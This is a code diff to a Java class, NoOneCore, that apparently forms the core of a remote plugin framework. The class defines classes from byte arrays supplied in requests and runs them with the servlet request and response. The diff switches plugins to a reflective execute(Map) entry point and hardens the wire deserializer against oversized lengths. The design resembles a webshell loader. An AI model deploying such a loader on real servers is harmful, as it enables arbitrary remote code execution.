@@ -1,6 +1,8 @@
 package com.reajason.noone.core;
 
 import java.io.*;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.*;
@@ -24,6 +26,11 @@ public class NoOneCore extends URLClassLoader {
     private static final String CLASS_RUN = "classRun";
     private static final String PLUGIN_CACHES = "pluginCaches";
     private static final String GLOBAL_CACHES = "globalCaches";
+    // Plugin contract v2: plugins implement Object execute(Map ctx) and return
+    // their result. No result key is written back into ctx.
+    private static final String PLUGIN_EXECUTE = "execute";
+    private static final String REQUEST = "request";
+    private static final String RESPONSE = "response";
 
     private static final String ACTION_STATUS = "status";
     private static final String ACTION_RUN = "run";
@@ -40,6 +47,8 @@ public class NoOneCore extends URLClassLoader {
     public static final Map<String, Object> loadedPluginCache = new ConcurrentHashMap<>();
     public static final Map<String, String> loadedPluginVersionCache = new ConcurrentHashMap<>();
     public static final Map<String, Object> globalCaches = new ConcurrentHashMap<>();
+    // plugin class to its resolved execute(Map) method
+    private static final Map<Class<?>, Method> pluginExecuteCache = new ConcurrentHashMap<>();
 
     private static volatile NoOneCore pluginClassLoader;
 
@@ -103,13 +112,14 @@ public class NoOneCore extends URLClassLoader {
                             try {
                                 Map<String, Object> shutdownCtx = new HashMap<>();
                                 shutdownCtx.put("op", "shutdown");
-                                service.equals(shutdownCtx);
+                                invokeExecute(service, shutdownCtx);
                             } catch (Throwable ignored) {
                             }
                         }
                         globalCaches.clear();
                         loadedPluginCache.clear();
                         loadedPluginVersionCache.clear();
+                        pluginExecuteCache.clear();
                         pluginClassLoader = null;
                         break;
                     default:
@@ -135,6 +145,48 @@ public class NoOneCore extends URLClassLoader {
 
     private Class<?> defineClass(String className, byte[] bytes) {
         return super.defineClass(className, bytes, 0, bytes.length);
+    }
+
+    /**
+     * Resolves the plugin entry point: {@code public Object execute(Map ctx)}.
+     * Cached per plugin class because the core instance is created per request.
+     */
+    private static Method resolveExecuteMethod(Object pluginObj) {
+        Class<?> pluginClass = pluginObj.getClass();
+        Method method = pluginExecuteCache.get(pluginClass);
+        if (method != null) {
+            return method;
+        }
+        try {
+            method = pluginClass.getDeclaredMethod(PLUGIN_EXECUTE, Map.class);
+        } catch (NoSuchMethodException e) {
+            throw new RuntimeException("plugin [" + pluginClass.getName()
+                    + "] does not implement execute(Map); regenerate it for this core version", e);
+        }
+        method.setAccessible(true);
+        pluginExecuteCache.put(pluginClass, method);
+        return method;
+    }
+
+    /**
+     * Invokes a plugin and returns its result. Plugin exceptions are unwrapped
+     * so callers see the originating stack trace.
+     */
+    private static Object invokeExecute(Object pluginObj, Map<String, Object> ctx) {
+        try {
+            return resolveExecuteMethod(pluginObj).invoke(pluginObj, ctx);
+        } catch (InvocationTargetException e) {
+            Throwable cause = e.getCause();
+            if (cause instanceof RuntimeException) {
+                throw (RuntimeException) cause;
+            }
+            if (cause instanceof Error) {
+                throw (Error) cause;
+            }
+            throw new RuntimeException(cause);
+        } catch (IllegalAccessException e) {
+            throw new RuntimeException("cannot access plugin execute(Map): " + e.getMessage(), e);
+        }
     }
 
     public Map<String, Object> getStatus() {
@@ -170,6 +222,8 @@ public class NoOneCore extends URLClassLoader {
         if (refresh) {
             Object pluginObj = loader.defineClass(className, pluginBytes)
                     .getDeclaredConstructor().newInstance();
+            pluginExecuteCache.clear();
+            resolveExecuteMethod(pluginObj);
             loadedPluginCache.put(plugin, pluginObj);
             loadedPluginVersionCache.put(plugin, version);
             result.put(CLASS_DEFINE, true);
@@ -181,6 +235,7 @@ public class NoOneCore extends URLClassLoader {
             if (pluginObj == null) {
                 pluginObj = loader.defineClass(className, pluginBytes)
                         .getDeclaredConstructor().newInstance();
+                resolveExecuteMethod(pluginObj);
                 loadedPluginCache.put(plugin, pluginObj);
                 loadedPluginVersionCache.put(plugin, version);
                 result.put(CLASS_DEFINE, true);
@@ -198,16 +253,17 @@ public class NoOneCore extends URLClassLoader {
         if (pluginObj == null) {
             throw new RuntimeException("plugin [" + plugin + "] not found");
         }
-        Map<String, Object> map = (Map<String, Object>) args.get(ARGS);
-        if (map == null) {
-            map = new HashMap<>();
-        }
-        map.put(PLUGIN_CACHES, loadedPluginCache);
-        map.put(GLOBAL_CACHES, globalCaches);
-        map.put("request", req);
-        map.put("response", res);
-        pluginObj.equals(map);
-        result.put(DATA, map.get("result"));
+        Map<String, Object> input = (Map<String, Object>) args.get(ARGS);
+        // Never mutate the caller's argument map; reserved runtime keys live
+        // only in the per-invocation context.
+        Map<String, Object> ctx = input == null
+                ? new HashMap<String, Object>()
+                : new HashMap<String, Object>(input);
+        ctx.put(PLUGIN_CACHES, loadedPluginCache);
+        ctx.put(GLOBAL_CACHES, globalCaches);
+        ctx.put(REQUEST, req);
+        ctx.put(RESPONSE, res);
+        result.put(DATA, invokeExecute(pluginObj, ctx));
         result.put(CLASS_RUN, true);
         return result;
     }
@@ -253,7 +309,14 @@ public class NoOneCore extends URLClassLoader {
     static final byte LIST = 0x7;
     static final byte OBJECT_ARRAY = 0x8;
     static final byte SET = 0x09;
+    // Strings whose modified UTF-8 representation exceeds MAX_UTF_LENGTH bytes
+    // are written with an int length and standard UTF-8 instead of writeUTF.
+    static final byte LONG_STRING = 0x0A;
     static final byte MAP = 0x10;
+    static final int MAX_UTF_LENGTH = 0xffff;
+    // Initial capacity cap for collections read from the wire, so a malicious
+    // size prefix cannot trigger a huge eager allocation.
+    private static final int INITIAL_CAPACITY_LIMIT = 1024;
 
     public byte[] serialize(Map<String, Object> map) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -290,8 +353,7 @@ public class NoOneCore extends URLClassLoader {
         if (obj == null) {
             dos.writeByte(NULL);
         } else if (obj instanceof String) {
-            dos.writeByte(STRING);
-            dos.writeUTF((String) obj);
+            writeStringObject(dos, (String) obj);
         } else if (obj instanceof Integer) {
             dos.writeByte(INTEGER);
             dos.writeInt((Integer) obj);
@@ -340,8 +402,8 @@ public class NoOneCore extends URLClassLoader {
     }
 
     private Map<String, Object> readMap(DataInputStream dis) throws IOException {
-        int size = dis.readInt();
-        Map<String, Object> map = new HashMap<>(size);
+        int size = readCollectionSize(dis, "map");
+        Map<String, Object> map = new HashMap<>(Math.min(size, INITIAL_CAPACITY_LIMIT));
         for (int i = 0; i < size; i++) {
             String key = dis.readUTF();
             Object value = readObject(dis);
@@ -357,6 +419,8 @@ public class NoOneCore extends URLClassLoader {
                 return null;
             case STRING:
                 return dis.readUTF();
+            case LONG_STRING:
+                return readLongString(dis);
             case INTEGER:
                 return dis.readInt();
             case LONG:
@@ -366,26 +430,26 @@ public class NoOneCore extends URLClassLoader {
             case BOOLEAN:
                 return dis.readBoolean();
             case BYTE_ARRAY:
-                int len = dis.readInt();
+                int len = readLength(dis, "byte array");
                 byte[] bytes = new byte[len];
                 dis.readFully(bytes);
                 return bytes;
             case SET:
-                int setSize = dis.readInt();
-                Set<Object> set = new LinkedHashSet<>(setSize);
+                int setSize = readCollectionSize(dis, "set");
+                Set<Object> set = new LinkedHashSet<>(Math.min(setSize, INITIAL_CAPACITY_LIMIT));
                 for (int i = 0; i < setSize; i++) {
                     set.add(readObject(dis));
                 }
                 return set;
             case LIST:
-                int listSize = dis.readInt();
-                List<Object> list = new ArrayList<>(listSize);
+                int listSize = readCollectionSize(dis, "list");
+                List<Object> list = new ArrayList<>(Math.min(listSize, INITIAL_CAPACITY_LIMIT));
                 for (int i = 0; i < listSize; i++) {
                     list.add(readObject(dis));
                 }
                 return list;
             case OBJECT_ARRAY:
-                int arrayLength = dis.readInt();
+                int arrayLength = readCollectionSize(dis, "array");
                 Object[] array = new Object[arrayLength];
                 for (int i = 0; i < arrayLength; i++) {
                     array[i] = readObject(dis);
@@ -396,6 +460,68 @@ public class NoOneCore extends URLClassLoader {
             default:
                 throw new IOException("Unknown data type found in stream: " + type);
         }
+    }
+
+    private void writeStringObject(DataOutputStream dos, String value) throws IOException {
+        if (modifiedUtfLength(value) <= MAX_UTF_LENGTH) {
+            dos.writeByte(STRING);
+            dos.writeUTF(value);
+            return;
+        }
+
+        byte[] bytes = value.getBytes("UTF-8");
+        dos.writeByte(LONG_STRING);
+        dos.writeInt(bytes.length);
+        dos.write(bytes);
+    }
+
+    private String readLongString(DataInputStream dis) throws IOException {
+        int length = readLength(dis, "string");
+        byte[] bytes = new byte[length];
+        dis.readFully(bytes);
+        return new String(bytes, "UTF-8");
+    }
+
+    private int modifiedUtfLength(String value) {
+        long length = 0;
+        for (int i = 0; i < value.length(); i++) {
+            int c = value.charAt(i);
+            if (c >= 0x0001 && c <= 0x007f) {
+                length++;
+            } else if (c > 0x07ff) {
+                length += 3;
+            } else {
+                length += 2;
+            }
+            if (length > MAX_UTF_LENGTH) {
+                return MAX_UTF_LENGTH + 1;
+            }
+        }
+        return (int) length;
+    }
+
+    private int readLength(DataInputStream dis, String what) throws IOException {
+        int length = dis.readInt();
+        if (length < 0) {
+            throw new IOException("Negative " + what + " length: " + length);
+        }
+        if (length > dis.available()) {
+            throw new IOException("Declared " + what + " length " + length
+                    + " exceeds remaining " + dis.available() + " bytes");
+        }
+        return length;
+    }
+
+    private int readCollectionSize(DataInputStream dis, String what) throws IOException {
+        int size = dis.readInt();
+        if (size < 0) {
+            throw new IOException("Negative " + what + " size: " + size);
+        }
+        if (size > dis.available()) {
+            throw new IOException("Declared " + what + " size " + size
+                    + " exceeds remaining " + dis.available() + " bytes");
+        }
+        return size;
     }
 
     private String getStackTraceAsString(Throwable throwable) {
